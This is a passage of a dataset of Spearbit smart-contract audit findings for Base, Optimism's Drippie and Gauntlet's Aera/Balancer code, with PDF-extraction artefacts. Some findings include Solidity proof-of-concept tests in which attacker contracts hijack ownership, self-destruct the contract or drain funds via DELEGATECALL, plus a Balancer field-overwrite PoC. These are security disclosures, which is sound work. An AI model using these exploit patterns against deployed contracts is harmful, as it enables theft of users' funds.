(cid:1) 2N(cid:0)1(cid:0)i ! N(cid:0)1 X i=0 bi (cid:1) 2i", "labels": ["Spearbit", "Base", "Severity: Informational"]}, {"title": "Comment and Variable improvements", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "The following are typos, comment improvements for clarity and variable improvements for consis- tency.", "labels": ["Spearbit", "Base", "Severity: Informational"]}, {"title": "Duplicate and Zero-Value Checks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "The initialize function in the AnchorStateRegistry contract does not currently check whether an anchor for a given gameType is already set or if the outputRoot is zero. This oversight can lead to duplicate entries and potentially invalid states, which could disrupt the functionality of the contract. Similarly, the constructor in PreImageOracle doesn't check if the _minProposalSize is zero. It is important for it to be non-zero as it is a condition for checking initialisation in addLeavesLPP .", "labels": ["Spearbit", "Base", "Severity: Informational"]}, {"title": "Immutable address validation on AnchorStateRegistry", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Base-Spearbit-Security-Review-August-2024.pdf", "body": "The DISPUTE_GAME_FACTORY address in the AnchorStateRegistry contract is marked as immutable and is set during the contract deployment. However, there is no validation to ensure that the address provided is correct and points to a valid IDisputeGameFactory contract. If an incorrect address is provided, the contract would have to be redeployed, which is costly and inefficient. This could be prevented by validating the address during the contract construction.", "labels": ["Spearbit", "Base", "Severity: Informational"]}, {"title": "Permitting Multiple Drip Calls Per Block", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "state.config.interval is 0. We are currently unaware of use cases where this is desirable. The inline comments correctly note that reentrancy is possible and permitted when Reentrancy is one risk, flashbot bundles are a similar risk where the drip may be called multiple times by the same actor in a single block. A malicious actor may abuse this ability, especially if interval is misconfigured as 0 due to JavaScript type coercion. A reentrant call or flashbot bundle may be used to frontrun an owner attempting to archive a drip or attempting to withdraw assets.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Medium Risk"]}, {"title": "Version Bump to Latest", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "During the review, a new version of solidity was released with an important bugfix.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "DOS from External Calls in Drippie.executable / Drippie.drip", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "In both the executable and drip (which also calls executable) functions, the Drippie contract interacts with some external contract via low-level calls. The external call could revert or fail with an Out of Gas exception causing the entire drip to fail. The severity is low beacuse in the case where a drip reverts due to a misconfigured or malicious dripcheck or target, the drip can still be archived and a new one can be created by the owner.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "Use call.value over transfer in withdrawETH", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "transfer is no longer recommended as a default due to unpredictable gas cost changes in future evm hard forks (see here for more background.) While useful to use transfer in some cases (such as sending to EOA or contract which does not process data in the fallback or receiver functions), this particular contract does not benefit: withdrawETH is already owner gated and is not at risk of reentrancy as owner already has permission to drain the contracts ether in a single call should they choose.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "Input Validation Checks for Drippie.create", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Drippie.create does not validate input potentially leading to unintended results. The function should check:  _name is not an empty string to avoid creating drip that would be able to read on frontend UI.  _config.dripcheck should not be address(0) otherwise executable will always revert.  _config.actions.length should be at least one (_config.actions.length > 0) to prevent creating drips that do nothing when executed.  DripAction.target should not be address(0) to prevent burning ETH or interacting with the zero address during drips execution.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "Ownership Initialization and Transfer Safety on Owned.setOwner", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Consider the following scenarios.  Scenario 1 Drippie allows the owner to be both initialized and set to address(0). If this scenario happens nobody will be able to manage the Drippie contract, thus preventing any of the following operations:  Creating a new drip  Updating a drips status (pausing, activating or archiving a drip) If set to the zero address, all the onlyOwner operations in AssetReceiver and Transactor will be uncallable. This scenario where the owner can be set to address(0) can occur when address(0) is passed to the construc- tor or setOwner.  Scenario 2 owner may be set to address(this). Given the static nature of DripAction.target and DripAction.data there is no benefit of setting owner to address(this), and all instances can be assumed to have been done so in error.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "Unchecked Return and Handling of Non-standard Tokens in AssetReceiver", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "The current AssetReceiver contract implement \"direct\" ETH and ERC20 token transfers, but does not cover edge cases like non-standard ERC20 tokens that do not:  revert on failed transfers  adhere to ERC20 interface (i.e. no return value) An ERC20 token that does not revert on failure would cause the WithdrewERC20 event to emit even though no transfer took place. An ERC20 token that does not have a return value will revert even if the call would have otherwise been successful. Solmate libraries already used inside the project offer a utility library called SafeTransferLib.sol which covers such edge cases. Be aware of the developer comments in the natspec: /// @dev Use with caution! Some functions in this library knowingly create dirty bits at the destination of the free memory pointer. /// @dev Note that none of the functions in this library check that a token has code at all! That responsibility is delegated to the caller.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "AssetReceiver Allows Burning ETH, ERC20 and ERC721 Tokens", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "AssetReceiver contains functions that allow the owner of the contract to withdraw ETH, ERC20 and ERC721 tokens. Those functions allow specifying the receiver address of ETH, ERC20 and ERC721 tokens but they do not check that the receiver address is not address(0). By not doing so, those functions allow to:  Burn ETH if sent to address(0).  Burn ERC20 tokens if sent to address(0) and the ERC20 _asset allow tokens to be burned via transfer (For example, Solmates ERC20 allow that, OpenZeppelin instead will revert if the recipient is address(0)).  Burn ERC721 tokens if sent to address(0) and the ERC721 _asset allow tokens to be burned via trans- ferFrom (For example, both Solmate and OpenZeppelin implementations prevent to send the _id to the address(0) but you dont know if that is still true about custom ERC721 contract that does not use those libraries).", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "AssetReceiver Not Implementing onERC721Received Callback Required by safeTransferFrom.", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "AssetReceiver contains the function withdrawERC721 that allow the owner to withdraw ERC721 tokens. As stated in the EIP-721, the safeTransferFrom (used by the sender to transfer ERC721 tokens to the AssetRe- ceiver) will revert if the target contract (AssetReceiver in this case) is not implementing onERC721Received and returning the expected value bytes4(keccak256(\"onERC721Received(address,address,uint256,bytes)\")).", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "Both Transactor.CALL and Transactor.DELEGATECALL Do Not Emit Events", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Transactor contains a \"general purpose\" DELEGATECALL and CALL function that allow the owner to execute a delegatecall and call toward a target address passing an arbitrary payload. Both of those functions are executing delegatecall and call without emitting any events. Because of the general- purpose nature of these function, it would be considered a good security measure to emit events to track the functions usage. Those events could be then used to monitor and track usage by external monitoring services.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "Both Transactor.CALL and Transactor.DELEGATECALL Do Not Check the Result of the Execution", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "The Transactor contract contains a \"general purpose\" DELEGATECALL and CALL function that allow the owner to execute a delegatecall and call toward a target address passing an arbitrary payload. Both functions return the delegatecall and call result back to the caller without checking whether execution was successful or not. By not implementing such check, the transaction could fail silently. Another side effect is that the ETH sent along with the execution (both functions are payable) would remain in the Drippie contract and not transferred to the _target. Test example showcasing the issue: contract Useless { // A contract that have no functions // No fallback functions // Will not accept ETH (only from selfdestruct/coinbase) } function test_transactorCALL() public { Useless useless = new Useless(); bool success; vm.deal(deployer, 3 ether); vm.deal(address(drippie), 0 ether); vm.deal(address(useless), 0 ether); vm.prank(deployer); // send 1 ether via `call` to a contract that cannot receive them 8 (success, ) = drippie.CALL{value: 1 ether}(address(useless), \"\", 100000, 1 ether); assertEq(success, false); vm.prank(deployer); // Perform a `call` to a not existing target's function (success, ) = drippie.CALL{value: 1 ether}(address(useless), abi.encodeWithSignature(\"notExistingFn()\"), 100000, 1 ether); assertEq(success, false); assertEq(deployer.balance, 1 ether); assertEq(address(drippie).balance, 2 ether); assertEq(address(useless).balance, 0); ,! } function test_transactorDELEGATECALL() public { Useless useless = new Useless(); bool success; vm.deal(deployer, 3 ether); vm.deal(address(drippie), 0 ether); vm.deal(address(useless), 0 ether); vm.prank(deployer); // send 1 ether via `delegatecall` to a contract that cannot receive them (success, ) = drippie.DELEGATECALL{value: 1 ether}(address(useless), \"\", 100000); assertEq(success, false); vm.prank(deployer); // Perform a `delegatecall` to a not existing target's function (success, ) = drippie.DELEGATECALL{value: 1 ether}(address(useless), abi.encodeWithSignature(\"notExistingFn()\"), 100000); assertEq(success, false); assertEq(deployer.balance, 1 ether); assertEq(address(drippie).balance, 2 ether); assertEq(address(useless).balance, 0); ,! }", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "Transactor.DELEGATECALL Data Overwrite and selfdestruct Risks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "The Transactor contract contains a \"general purpose\" DELEGATECALL function that allow the owner to execute a delegatecall toward a target address passing an arbitrary payload. Consider the following scenarios:  Scenario 1 A malicious target contract could selfdestruct the Transactor contract and as a consequence the contract that is inheriting from Transactor. Test example showcasing the issue: 9 contract SelfDestroyer { function destroy(address receiver) external { selfdestruct(payable(receiver)); } } function test_canOwnerSelftDestructDrippie() public { // Assert that Drippie exist assertStatus(DEFAULT_DRIP_NAME, Drippie.DripStatus.PAUSED); assertGt(getContractSize(address(drippie)), 0); // set it to active vm.prank(deployer); drippie.status(DEFAULT_DRIP_NAME, Drippie.DripStatus.ACTIVE); assertStatus(DEFAULT_DRIP_NAME, Drippie.DripStatus.ACTIVE); // fund the drippie with 1 ETH vm.deal(address(drippie), 1 ether); uint256 deployerBalanceBefore = deployer.balance; uint256 drippieBalanceBefore = address(drippie).balance; // deploy the destroyer SelfDestroyer selfDestroyer = new SelfDestroyer(); vm.prank(deployer); drippie.DELEGATECALL(address(selfDestroyer), abi.encodeWithSignature(\"destroy(address)\", deployer), gasleft()); ,! uint256 deployerBalanceAfter = deployer.balance; uint256 drippieBalanceAfter = address(drippie).balance; // assert that the deployer has received the balance that was present in Drippie assertEq(deployerBalanceAfter, deployerBalanceBefore + drippieBalanceBefore); assertEq(drippieBalanceAfter, 0); // Weird things happens with forge // Because we are in the same block the code of the contract is still > 0 so // Cannot use assertEq(getContractSize(address(drippie)), 0); // Known forge issue // 1) Forge resets storage var to 0 after self-destruct (before tx ends) 2654 -> https://github.com/foundry-rs/foundry/issues/2654 // 2) selfdestruct has no effect in test 1543 -> https://github.com/foundry-rs/foundry/issues/1543 assertStatus(DEFAULT_DRIP_NAME, Drippie.DripStatus.PAUSED); ,! }  Scenario 2 The delegatecall allows the owner to intentionally, or accidentally, overwrite the content of the drips mapping. By being able to modify the drips mapping, a malicious user would be able to execute a series of actions like: Changing drips status:  Activating an archived drip  Deleting a drip by changing the status to NONE (this allows the owner to override entirely the drip by calling again create)  Switching an active/paused drip to paused/active 10  etc.. Change drips interval:  Prevent a drip from being executed any more by setting interval to a very high value  Allow a drip to be executed more frequently by lowering the interval value  Enable reentrancy by setting interval to 0 Change drips actions:  Override an action to send drips contract balance to an arbitrary address  etc.. Test example showcasing the issue: contract ChangeDrip { address public owner; mapping(string => Drippie.DripState) public drips; function someInnocentFunction() external { drips[\"FUND_BRIDGE_WALLET\"].config.actions[0] = Drippie.DripAction({ target: payable(address(1024)), data: new bytes(0), value: 1 ether }); } } 11 function test_canDELEGATECALLAllowReplaceAction() public { vm.deal(address(drippie), 10 ether); vm.deal(address(attacker), 0 ether); // Create an action with name \"FUND_BRIDGE_WALLET\" that have the function // To fund a wallet vm.startPrank(deployer); string memory fundBridgeWalletName = \"FUND_BRIDGE_WALLET\"; Drippie.DripAction[] memory actions = new Drippie.DripAction[](1); // The first action will send Bob 1 ether actions[0] = Drippie.DripAction({ target: payable(address(alice)), data: new bytes(0), value: 1 ether ,! }); Drippie.DripConfig memory config = createConfig(100, IDripCheck(address(checkTrue)), new bytes(0), actions); drippie.create(fundBridgeWalletName, config); drippie.status(fundBridgeWalletName, Drippie.DripStatus.ACTIVE); vm.stopPrank(); // Deploy the malicius contract vm.prank(attacker); ChangeDrip changeDripContract = new ChangeDrip(); // make the owner of drippie call via DELEGATECALL an innocentfunction of the exploiter contract vm.prank(deployer); drippie.DELEGATECALL(address(changeDripContract), abi.encodeWithSignature(\"someInnocentFunction()\"), 1000000); ,! // Now the drip action should have changed, anyone can execute it and funds would be sent to // the attacker and not to the bridge wallet drippie.drip(fundBridgeWalletName); // Assert we have drained Drippie assertEq(attacker.balance, 1 ether); assertEq(address(drippie).balance, 9 ether); }  Scenario 3 Calling a malicious contract or accidentally calling a contract which does not account for Drippies storage layout can result in owner being overwritten. Test example showcasing the issue: contract GainOwnership { address public owner; function someInnocentFunction() external { owner = address(1024); } } 12 function test_canDELEGATECALLAllowOwnerLoseOwnership() public { vm.deal(address(drippie), 10 ether); vm.deal(address(attacker), 0 ether); // Deploy the malicius contract vm.prank(attacker); GainOwnership gainOwnershipContract = new GainOwnership(); // make the owner of drippie call via DELEGATECALL an innocentfunction of the exploiter contract vm.prank(deployer); drippie.DELEGATECALL(address(gainOwnershipContract), abi.encodeWithSignature(\"someInnocentFunction()\"), 1000000); ,! // Assert that the attacker has gained onwership assertEq(drippie.owner(), attacker); // Steal all the funds vm.prank(attacker); drippie.withdrawETH(payable(attacker)); // Assert we have drained Drippie assertEq(attacker.balance, 10 ether); assertEq(address(drippie).balance, 0 ether); }", "labels": ["Spearbit", "OptimismDrippie", "Severity: Low Risk"]}, {"title": "Use calldata over memory", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Some gas savings if function arguments are passed as calldata instead of memory.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Gas Optimization"]}, {"title": "Avoid String names in Events and Mapping Key", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Drip events emit an indexed nameref and the name as a string. These strings must be passed into every drip call adding to gas costs for larger strings.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Gas Optimization"]}, {"title": "Avoid Extra sloads on Drippie.status", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Information for emitting event can be taken from calldata instead of reading from storage. Can skip repeat drips[_name].status reads from storage.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Gas Optimization"]}, {"title": "Use Custom Errors Instead of Strings", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "To save some gas the use of custom errors leads to cheaper deploy time cost and run time cost. The run time cost is only relevant when the revert condition is met.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Gas Optimization"]}, {"title": "Increment In The For Loop Post Condition In An Unchecked Block", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "This is only relevant if you are using the default solidity checked arithmetic. i++ involves checked arithmetic, which is not required. This is because the value of i is always strictly less than length <= 2**256 - 1. Therefore, the theoretical maximum value of i to enter the for-loop body is 2**256 - 2. This means that the i++ in the for loop can never overflow. Regardless, the overflow checks are performed by the compiler. Unfortunately, the Solidity optimizer is not smart enough to detect this and remove the checks. One can manually do this by: for (uint i = 0; i < length; ) { // do something that doesn't change the value of i unchecked { ++i; } }", "labels": ["Spearbit", "OptimismDrippie", "Severity: Gas Optimization"]}, {"title": "DripState.count Location and Use", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "DripState.count is recorded and never used within the Drippie or IDripCheck contracts. DripState.count is also incremented after all external calls, inconsistent with Checks, Effects, Interactions con- vention.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Type Checking Foregone on DripCheck", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Passing params as bytes makes for a flexible DripCheck, however, type checking is lost.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Confirm Blind ERC721 Transfers are Intended", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "AssetReceiver uses transferFrom instead of safeTransferFrom. The callback on safeTransferFrom often poses a reentrancy risk but in this case the function is restricted to onlyOwner.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Code Contains Empty Blocks", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Its best practice that when there is an empty block, to add a comment in the block explaining why its empty. While not technically errors, they can cause confusion when reading code.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Code Structure Deviates From Best-Practice", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "The best-practice layout for a contract should follow this order:  State variables.  Events.  Modifiers.  Constructor.  Functions. Function ordering helps readers identify which functions they can call and find constructor and fallback functions easier. Functions should be grouped according to their visibility and ordered as: constructor, receive function (if ex- ists), fallback function (if exists), external, public, internal, private. Some constructs deviate from this recommended best-practice: structs and mappings after events.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Missing or Incomplete NatSpec", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Some functions are missing @notice/@dev NatSpec comments for the function, @param for all/some of their parameters and @return for return values. Given that NatSpec is an important part of code documentation, this affects code comprehension, auditability and usability.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Checking Boolean Against Boolean", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "executable returns a boolean in which case the comparison to true is unnecessary. executable also reverts if any precondition check fails in which case false will never be returned.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Drippie.executable Never Returns false Only true or Reverts", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "executable(string memory _name) public view returns (bool). The executable implemented in the Drippie contract has the following signature From the signature and the natspec documentation @return True if the drip is executable, false other- wise. Without reading the code, a user/developer would expect that the function returns true if all the checks passes otherwise false but in reality the function will always return true or revert. Because of this behavior, a reverting drip that do not pass the requirements inside executable will never revert with the message present in the following code executed by the drip function require( executable(_name) == true, \"Drippie: drip cannot be executed at this time, try again later\" );", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Drippie Use Case Notes", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Drippie intends to support use cases outside of the initial hot EOA top-up use case demonstrated by Optimism. To further clarify, weve noted that drips support:  Sending eth  External function calls with fixed params  Preconditions Examples include, conditionally transferring eth or tokens. Calling an admin function iff preconditions are met. Drips do not support:  Updating the drip contract storage  Altering params  Postconditions Examples include, vesting contracts or executing Uniswap swaps based on recent moving averages (which are not without their own risks). Where dynamic params or internal accounting is needed, a separate contract needs to be paired with the drip.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Augment Documentation for dripcheck.check Indicating Precondition Check Only Performed", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Before executing the whole batch of actions the drip function call executable that check if the drip can be executed. Inside executable an external contract is called by this instruction require( state.config.dripcheck.check(state.config.checkparams), \"Drippie: dripcheck failed so drip is not yet ready to be triggered\" ); Optimism provided some examples like checking if a target balance is below a specific threshold or above that threshold, but in general, the dripcheck.check invocation could perform any kind of checks. The important part that should be clear in the natspec documentation of the drip function is that that specific check is performed only once before the execution of the bulk of actions.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Considerations on the drip state.last and state.config.interval values", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "When the drip function is called by an external actor, the executable is executed to check if the drip meets all the needed requirements to be executed. The only check that is done regarding the drip state.last and state.config.interval is this require( state.last + state.config.interval <= block.timestamp, \"Drippie: drip interval has not elapsed since last drip\" ); The state.time is never really initialized when the create function is called, this means that it will be automatically initialized with the default value of the uint256 type: 0.  Consideration 1: Drips could be executed as soon as created Depending on the value set to state.config.interval the executables logic implies that as soon as a drip is created, the drip can be immediately (even in the same transaction) executed via the drip function.  Consideration 2: A very high value for interval could make the drip never executable block.timestamp represents the number of seconds that passed since Unix Time (1970-01-01T00:00:00Z). When the owner of the Drippie want to create a \"one shot\" drip that can be executed immediately after creation but only once (even if the owner forgets to set the drips status to ARCHIVED) he/she should be aware that the max value that he/she can use for the interval is at max block.timestamp. This mean that the second time the drip can be executed is after block.timestamp seconds have been passed. If, for example, the owner create right now a drip with interval = block.timestamp it means that after the first execution the same drip could be executed after ~52 years (~2022-1970).", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Support ERC1155 in AssetReceiver", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "AssetReceiver support ERC20 and ERC721 interfaces but not ERC1155.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Reorder DripStatus Enum for Clarity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "The current implementation of Drippie contract has the following enum type: enum DripStatus { NONE, // uint8(0) ACTIVE, PAUSED, ARCHIVED } When a drip is created via the create function, its status is initialized to PAUSED (equal to uint8(2)) and when it gets activated its status is changed to ACTIVE (equal to uint8(1)) So, the status change from 0 (NONE) to 2 (PAUSED) to 1 (ACTIVE). Switching the order inside the enum DripStatus definition between PAUSED and ACTIVE would make it more clean and easier to understand.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "_gas is Unneeded as Transactor.CALL and Transactor.DELEGATECALL Function Argument", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "The caller (i.e. contract owner) can control desired amount of gas at the transaction level.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Licensing Conflict on Inherited Dependencies", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Solmate contracts are AGPL Licensed which is incompatible with the MIT License of Drippie related contracts.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Rename Functions for Clarity", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "status The status(string memory _name, DripStatus _status) function allows the owner to update the status of a drip. The purpose of the function, based on the name, is not obvious at first sight and could confuse a user into believing that its a view function to retrieve the status of a drip instead of mutating its status. executable The executable(string memory _name) public view returns (bool) function returns true if the drip with name _name can be executed.", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Owner Has Permission to Drain Value from Drippie Contract", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/OptimismDrippie-Spearbit-Security-Review.pdf", "body": "Consider the following scenarios.  Scenario 1 Owner may create arbitrary drips, including a drip to send all funds to themselves.  Scenario 2 AssetReceiver permits owner to withdraw ETH, ERC20 tokens, and ERC721 tokens.  Scenario 3 Owner may execute arbitrary calls. Transactor.CALL function is a function that allows the owner of the contract to execute a \"general purpose\" low- level call. function CALL( address _target, bytes memory _data, uint256 _gas, uint256 _value ) external payable onlyOwner returns (bool, bytes memory) { return _target.call{ gas: _gas, value: _value }(_data); } The function will transfer _value ETH present in the contract balance to the _target address. The function is also payable and this mean that the owner can send along with the call some funds. Test example showcasing the issue: 23 function test_transactorCALLAllowOwnerToDrainDrippieContract() public { bool success; vm.deal(deployer, 0 ether); vm.deal(bob, 0 ether); vm.deal(address(drippie), 1 ether); vm.prank(deployer); // send 1 ether via `call` to a contract that cannot receive them (success, ) = drippie.CALL{value: 0 ether}(bob, \"\", 100000, 1 ether); assertEq(success, true); assertEq(address(drippie).balance, 0 ether); assertEq(bob.balance, 1 ether); }", "labels": ["Spearbit", "OptimismDrippie", "Severity: Informational"]}, {"title": "Important Balancer fields can be overwritten by EndTime", "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Gauntlet-Spearbit-Security-Review.pdf", "body": "Balancers ManagedPool uses 32 bit values for startTime and endTime but it does not verify if those values exist within that range. Values are stored in a 32-byte _miscData slot in BasePool via the insertUint32() function. Nevertheless, this function does not strip any excess bits, resulting in other fields stored in _miscData to be overwritten. In the version that Aera Vault uses only the \"restrict LP\" field can be overwritten and by carefully crafting the value of endTime, the \"restrict LP\" boolean can be switched off, allowing anyone to use joinPool. The Manager could cause this behavior via the updateWeightsGradually() function while the Owner could do it via enableTradingWithWeights(). Note: This issue has been reported to Balancer by the Spearbit team. contract ManagedPool is BaseWeightedPool, ReentrancyGuard { // f14de92ac443d6daf1f3a42025b1ecdb8918f22e 32 bits | 1 bit | | | restrict LP | end time 32 bits | ] 7 bits | start time | total tokens | swap flag ] 1 bit // [ 64 bits // [ reserved | // |MSB | 119 bits | unused function _startGradualWeightChange(uint256 startTime, uint256 endTime, ... ) ... { ... _setMiscData( _getMiscData().insertUint32(startTime, _START_TIME_OFFSET).insertUint32(endTime, ,! _END_TIME_OFFSET) ); // this convert the values to 32 bits ... } } In the latest version of ManagedPool many more fields can be overwritten, including:  LP flag  Fee end/Fee start  Swap flag contract ManagedPool is BaseWeightedPool, AumProtocolFeeCache, ReentrancyGuard { // current version // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB 1 bit | 31 bits | | 31 bits 32 bits | 64 bits | 32 bits 1 bit | | The following POC shows how fields can be manipulated. // SPDX-License-Identifier: MIT pragma solidity ^0.8.13; import \"hardhat/console.sol\"; contract checkbalancer { uint256 private constant _MASK_1 = 2**(1) - 1; uint256 private constant _MASK_31 = 2**(31) - 1; uint256 private constant _MASK_32 = 2**(32) - 1; uint256 private constant _MASK_64 = 2**(64) - 1; uint256 private constant _MASK_192 = 2**(192) - 1; 5 | | 1 bit 64 bits | | 31 bits 1 bit | 31 bits | // [ 64 bits ] // [ swap fee | LP flag | fee end | swap flag | fee start | end swap | end wgt | start wgt ] LSB| // |MSB uint256 private constant _WEIGHT_START_TIME_OFFSET = 0; uint256 private constant _WEIGHT_END_TIME_OFFSET = 32; uint256 private constant _END_SWAP_FEE_PERCENTAGE_OFFSET = 64; uint256 private constant _FEE_START_TIME_OFFSET = 128; uint256 private constant _SWAP_ENABLED_OFFSET = 159; uint256 private constant _FEE_END_TIME_OFFSET = 160; uint256 private constant _MUST_ALLOWLIST_LPS_OFFSET = 191; uint256 private constant _SWAP_FEE_PERCENTAGE_OFFSET = 192; 32 bits | 32 bits function insertUint32(bytes32 word,uint256 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_32 << offset)); return clearedWord | bytes32(value << offset); } function decodeUint31(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_31; } function decodeUint32(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_32; } function decodeUint64(bytes32 word, uint256 offset) internal pure returns (uint256) { return uint256(word >> offset) & _MASK_64; } function decodeBool(bytes32 word, uint256 offset) internal pure returns (bool) { return (uint256(word >> offset) & _MASK_1) == 1; } function insertBits192(bytes32 word,bytes32 value,uint256 offset) internal pure returns (bytes32) { bytes32 clearedWord = bytes32(uint256(word) & ~(_MASK_192 << offset)); return clearedWord | bytes32((uint256(value) & _MASK_192) << offset); } constructor() { bytes32 poolState; bytes32 miscData; uint startTime = 1 + 2*2**32; uint endTime = 3 + 4*2**32 + 5*2**(32+64) + 2**(32+64+31) + 6*2**(32+64+31+1) + ,! 2**(32+64+31+1+31) + 7*2**(32+64+31+1+31+1); poolState = insertUint32(poolState,startTime, _WEIGHT_START_TIME_OFFSET); poolState = insertUint32(poolState,endTime, _WEIGHT_END_TIME_OFFSET); miscData = insertBits192(miscData,poolState,0); decodeUint32(miscData, console.log(\"startTime\", console.log(\"endTime\", decodeUint32(miscData, console.log(\"endSwapFeePercentage\", decodeUint64(miscData, _WEIGHT_START_TIME_OFFSET)); // 1 // 3 _WEIGHT_END_TIME_OFFSET)); _END_SWAP_FEE_PERCENTAGE_OFFSET)); ,! // 4 console.log(\"Fee startTime\", console.log(\"Swap enabled\", console.log(\"Fee endTime\", 